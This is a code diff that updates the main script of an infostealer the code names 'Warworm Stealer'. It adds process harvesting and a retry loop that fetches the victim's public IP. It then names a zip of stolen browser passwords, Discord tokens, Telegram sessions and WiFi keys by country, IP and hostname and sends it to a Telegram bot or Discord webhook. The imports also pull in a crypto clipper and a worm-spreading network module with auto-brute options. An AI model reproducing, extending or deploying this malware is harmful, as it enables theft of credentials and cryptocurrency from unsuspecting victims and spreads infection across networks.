@@ -21,13 +21,14 @@ import ipaddress
 import threading
 import platform
 import psutil
+import traceback
  
 from datetime import datetime
 
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'modules'))
 
 try:
-    from modules.collected_info import get_system_info, capture
+    from modules.collected_info import get_system_info, capture, get_public_ip_info
     from modules.telegram_steal import steal_telegram
     from modules.discord_token import steal_discord
     from modules.browser_stealer import steal_all_passwords, save_passwords
@@ -36,15 +37,15 @@ try:
     from modules.bot import ResultSender
     from modules.crypto_clipper import get_clipper
     from modules.worm_network import run_network_scan
+    from modules.process_manager import collect_processes, ProcessManager
 except ImportError as e:
     print(f"[!] Module import error: {e}")
-    import traceback
     traceback.print_exc()
     sys.exit(1)
 
 # ==================== CONFIG (will be replaced by builder) ====================
 CONFIG = {
-    "version": "1.0.0",
+    "version": "1.2.0",
     "last_updated": "2026-01-01T00:00:00",
     "pyinstaller_settings": {
         "onefile": False,
@@ -59,6 +60,7 @@ CONFIG = {
         "discord_webhook": ""
     },
     "features": {
+        "process_manager": False,
         "system_info": False,
         "screenshot": False,
         "browser_passwords": False,
@@ -121,7 +123,7 @@ def save_errors(output_dir):
             errors_file = os.path.join(output_dir, "errors.txt")
             with open(errors_file, 'w', encoding='utf-8') as f:
                 f.write("=" * 70 + "\n")
-                f.write("                    WARWORM STEALER - ERROR LOG\n")
+                f.write("                    Warworm Stealer - Error Log\n")
                 f.write("=" * 70 + "\n\n")
                 f.write(f"Total Errors: {len(ERROR_LOG)}\n\n")
                 for err in ERROR_LOG:
@@ -575,7 +577,6 @@ def generate_html_report(output_dir, clipper_running=False):
             except Exception as e:
                 screenshot_error = str(e)
                 print(f"    [DEBUG] EXCEPTION: {e}")
-                import traceback
                 traceback.print_exc()
         else:
             print(f"    [DEBUG] No screenshot_file set")
@@ -584,7 +585,21 @@ def generate_html_report(output_dir, clipper_running=False):
     
     print(f"    [DEBUG] FINAL: has_screenshot={has_screenshot}, screenshot_file={screenshot_file}, error={screenshot_error}")
 
-    
+    # Process Manager
+
+    has_processes = False
+    process_data = None
+    process_file = os.path.join(output_dir, "process_list.json")
+    if os.path.exists(process_file):
+        try:
+            with open(process_file, 'r', encoding='utf-8') as f:
+                process_data = json.load(f)
+                has_processes = True
+        except:
+            pass
+
+
+
     # Read Passwords
     passwords_data = []
     has_passwords = False
@@ -801,6 +816,7 @@ def generate_html_report(output_dir, clipper_running=False):
 
     status_cards = [
         status_card('💻', 'System Info', has_system, f"{len(sys_data['raw_lines'])} lines" if has_system else 'Not found', 'system-section'),
+        status_card('⚙️', 'Processes', has_processes, f"{process_data['metadata']['total_processes']} processes" if has_processes else 'Not scanned', 'process-section'),
         status_card('📸', 'Screenshot', has_screenshot, screenshot_detail, 'screenshot-section'),
         status_card('🔐', 'Passwords', has_passwords, f"{len(passwords_data)} entries" if has_passwords else 'Not found', 'passwords-section'),
         status_card('🎮', 'Discord', has_discord, discord_detail, 'discord-section'),
@@ -885,10 +901,9 @@ def generate_html_report(output_dir, clipper_running=False):
         
     # Passwords  
     if has_passwords and len(passwords_data) > 0:
-         
         pwd_json = json.dumps(passwords_data)
         pwd_b64 = base64.b64encode(pwd_json.encode()).decode()
-        
+            
         pwd_script = """
         <script>
             (function(){
@@ -922,7 +937,7 @@ def generate_html_report(output_dir, clipper_running=False):
         </script>
         """
 
-    sections_html.append(f'<div class="section" id="passwords-section" style="display: none;"><h2>🔐 Browser Passwords <span class="file-badge">{len(passwords_data)} entries (all browsers)</span></h2><div id="passwords-container"></div>{pwd_script}</div>')
+        sections_html.append(f'<div class="section" id="passwords-section" style="display: none;"><h2>🔐 Browser Passwords <span class="file-badge">{len(passwords_data)} entries (all browsers)</span></h2><div id="passwords-container"></div>{pwd_script}</div>')
     
     # WiFi
     if has_wifi:
@@ -953,6 +968,61 @@ def generate_html_report(output_dir, clipper_running=False):
         </script>
         """
         sections_html.append(f'<div class="section" id="wifi-section" style="display: none;"><h2>📶 WiFi Networks <span class="file-badge">{len(wifi_networks)} networks</span></h2><div id="wifi-container"></div>{wifi_script}</div>')
+
+    # Process Manager 
+    if has_processes and process_data:
+        proc_meta = process_data.get('metadata', {})
+        proc_list = process_data.get('processes', [])
+        
+        # Top processes by memory
+        top_procs = sorted(proc_list, key=lambda x: x.get('memory_mb', 0), reverse=True)
+
+        process_html = f'''
+        <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 1.5rem;">
+            <div style="background: rgba(0,0,0,0.3); padding: 1rem; border-radius: 8px; text-align: center;">
+                <div style="font-size: 1.5rem; color: var(--primary); font-weight: bold;">{proc_meta.get('total_processes', 0)}</div>
+                <div style="font-size: 0.8rem; color: var(--text-secondary);">Total Processes</div>
+            </div>
+            <div style="background: rgba(0,0,0,0.3); padding: 1rem; border-radius: 8px; text-align: center;">
+                <div style="font-size: 1.5rem; color: var(--warning); font-weight: bold;">{proc_meta.get('system_processes', 0)}</div>
+                <div style="font-size: 0.8rem; color: var(--text-secondary);">System</div>
+            </div>
+            <div style="background: rgba(0,0,0,0.3); padding: 1rem; border-radius: 8px; text-align: center;">
+                <div style="font-size: 1.5rem; color: var(--success); font-weight: bold;">{proc_meta.get('user_processes', 0)}</div>
+                <div style="font-size: 0.8rem; color: var(--text-secondary);">User</div>
+            </div>
+            <div style="background: rgba(0,0,0,0.3); padding: 1rem; border-radius: 8px; text-align: center;">
+                <div style="font-size: 1.5rem; color: var(--danger); font-weight: bold;">{proc_meta.get('high_resource', 0)}</div>
+                <div style="font-size: 0.8rem; color: var(--text-secondary);">High Resource</div>
+            </div>
+        </div>
+        
+        <h3 style="color: var(--primary); margin: 1.5rem 0 1rem 0;">Top Memory Consumers</h3>
+        <table>
+            <tr>
+                <th>PID</th>
+                <th>Name</th>
+                <th>Memory (MB)</th>
+                <th>CPU %</th>
+                <th>User</th>
+            </tr>
+        '''
+        
+        for proc in top_procs:
+            process_html += f'''
+            <tr>
+                <td>{proc.get('pid', 'N/A')}</td>
+                <td>{proc.get('name', 'Unknown')}</td>
+                <td style="color: var(--primary); font-weight: bold;">{proc.get('memory_mb', 0)} MB</td>
+                <td>{proc.get('cpu_percent', 0)}%</td>
+                <td style="font-size: 0.8rem;">{(proc.get('username') or 'Unknown')[:20]}</td>
+            </tr>
+            '''
+        
+        process_html += '</table>'
+        
+        sections_html.append(f'<div class="section" id="process-section" style="display: none;"><h2>⚙️ Process Manager <span class="file-badge">process_list.txt</span></h2>{process_html}</div>')
+
 
     # Network  
     if has_network:
@@ -1219,7 +1289,19 @@ def run_data_collection():
         except Exception as e:
             log_error("Collection:SystemInfo", str(e))
             print(f"[!] System info error: {e}")
-
+    # 1.1 Process Manager 
+    if CONFIG["features"].get("process_manager", False):
+        try:
+            print("[*] Collecting process information...")
+            pm = ProcessManager()
+            pm.collect_all_processes()
+            pm.save_to_file(output_dir)
+            summary = pm.get_summary()
+            results["processes"] = summary
+            print(f"    [+] Found {summary['total']} processes ({summary['system']} system, {summary['user']} user)")
+        except Exception as e:
+            log_error("Collection:ProcessManager", str(e))
+            print(f"[!] Process manager error: {e}")
     # 2. Screenshot
     if CONFIG["features"].get("screenshot", False):
         try:
@@ -1275,7 +1357,6 @@ def run_data_collection():
         except Exception as e:
             log_error("Collection:Discord", str(e))
             print(f"[!] Discord token error: {e}")
-            import traceback
             traceback.print_exc()
 
     # 5. Telegram Session
@@ -1296,8 +1377,6 @@ def run_data_collection():
             print("    [+] Network scan complete")
         except Exception as e:
             log_error("Collection:NetworkScan", str(e))
-            print(f"[!] Network scan error: {e}")
-            import traceback
             traceback.print_exc()
 
     # 7. WiFi Passwords
@@ -1381,42 +1460,67 @@ def run_data_collection():
         except Exception as e:
             log_error("Collection:WormNetwork", str(e))
             print(f"[!] Worm network error: {e}")
-            import traceback
             traceback.print_exc()
     else:
         print(f"    [*] Skipping worm network scan (network_scan={CONFIG['features'].get('network_scan')}, auto_brute={CONFIG['features'].get('auto_brute')})")
 
     return results, temp_dir
 
+
 def send_results(zip_path, system_info_path, hostname, username, public_ip, country_code):
-    #Send results with custom filename format: {country}_{IP}_{Hostname}.zip BY SINGLE MESSAGE 
+    # Send results with custom filename format: {country}_{IP}_{Hostname}.zip  
     delivery_results = {}
+     
 
     try:
         print("[*] Sending results...")
         
-        # Build custom filename: xxx_IP_Hostname.zip or Country_IP_Hostname.zip
+        # Retry loop if IP is xxx
+        retry_count = 0
+        max_retries = 10
+        
+        while retry_count < max_retries:
+            # Check if IP is valid (not xxx/XX)
+            if public_ip and public_ip != "xxx" and country_code and country_code != "XX":
+                print(f"[+] Valid IP: {public_ip} ({country_code})")
+                break
+            
+            print(f"[!] Got xxx/invalid - Retrying {retry_count + 1}/{max_retries}")
+            fresh = get_public_ip_info()
+            
+            if fresh and fresh.get('ip') and fresh.get('ip') != "xxx":
+                public_ip = fresh.get('ip')
+                country_code = fresh.get('country_code', 'XX')
+                print(f"[+] New IP: {public_ip} / {country_code}")
+                break
+            
+            retry_count += 1
+            time.sleep(1)
+        
+        # Build filename: xxx_IP_Hostname.zip or Country_IP_Hostname.zip
         country = country_code if country_code and country_code != "XX" else "xxx"
+        
+        # Clean hostname: replace spaces and dashes with underscores
         safe_hostname = hostname.replace(" ", "_").replace("-", "_") if hostname else "Unknown"
+        
+        # Clean IP: replace dots with underscores
         safe_ip = public_ip.replace(".", "_") if public_ip else "Unknown"
+        
         custom_filename = f"{country}_{safe_ip}_{safe_hostname}.zip"
+        print(f"[*] Filename: {custom_filename}")
         
-        print(f"    [*] Custom filename: {custom_filename}")
-        
-        # Rename zip temporarily
-        import shutil
+        # Copy zip with new name
         custom_zip_path = os.path.join(os.path.dirname(zip_path), custom_filename)
         shutil.copy2(zip_path, custom_zip_path)
         
-        # Create sender with credentials from CONFIG
+        # Send via Telegram/Discord
         sender = ResultSender(
             telegram_token=CONFIG["delivery"].get("telegram_token"),
             telegram_chat_id=CONFIG["delivery"].get("telegram_chat_id"),
             discord_webhook=CONFIG["delivery"].get("discord_webhook")
         )
 
-        # Use the new single-message method
-        if custom_zip_path and os.path.exists(custom_zip_path):
+        if os.path.exists(custom_zip_path):
             delivery_results = sender.send_file_with_caption(
                 custom_zip_path, 
                 system_info_path, 
@@ -1427,7 +1531,7 @@ def send_results(zip_path, system_info_path, hostname, username, public_ip, coun
                 icon = "✓" if status['success'] else "✗"
                 print(f"    {icon} {platform}: {status['message']}")
         
-        # Cleanup temp file
+        # Cleanup
         try:
             if os.path.exists(custom_zip_path) and custom_zip_path != zip_path:
                 os.remove(custom_zip_path)
@@ -1435,12 +1539,13 @@ def send_results(zip_path, system_info_path, hostname, username, public_ip, coun
             pass
             
     except Exception as e:
-        print(f"[!] Delivery error: {e}")
+        print(f"[!] Error: {e}")
         import traceback
         traceback.print_exc()
         delivery_results["error"] = str(e)
 
     return delivery_results
+ 
 
 def main():
 
@@ -1490,7 +1595,6 @@ def main():
         except Exception as e:
             log_error("Main:Report", str(e))
             print(f"    [!] Report generation error: {e}")
-            import traceback
             traceback.print_exc()
 
         # STEP 4: Create ZIP archive
@@ -1557,7 +1661,6 @@ def main():
     except Exception as e:
         log_error("Main:Delivery", str(e))
         print(f"\n[!] Fatal error: {e}")
-        import traceback
         traceback.print_exc()
 
         if keep_alive and clipper and clipper.running:
